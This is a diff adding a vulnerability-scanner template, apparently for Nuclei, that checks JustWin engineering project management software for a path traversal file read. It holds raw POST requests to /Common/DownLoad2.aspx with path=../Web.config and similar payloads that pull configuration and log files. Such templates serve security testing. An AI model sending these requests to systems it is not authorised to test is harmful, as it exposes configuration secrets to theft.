@@ -1,0 +1,52 @@
+id: justwin-file-read
+info:
+  name: JustWin Engineering Project Management Software File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    JustWin engineering management software contains a file reading vulnerability which allows attackers to obtain sensitive system files.
+  tags: file-read
+  reference:
+    - http://www.justwin.cn
+
+variables:
+  filePath:
+    - Web.config
+    - log.aspx
+    - log4net.config
+
+http:
+  - raw:
+      - |
+        POST /Common/DownLoad2.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        path=../Web.config&Name=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "cn.justwin.BLL.BasicProjectCode"
+  - raw:
+      - |
+        POST /Common/DownLoad2.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        path=../{{filePath}}&Name=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: file_content
+        part: body
+        regex:
+          - "cn\\.justwin\\.BLL\\.[a-zA-Z]+"
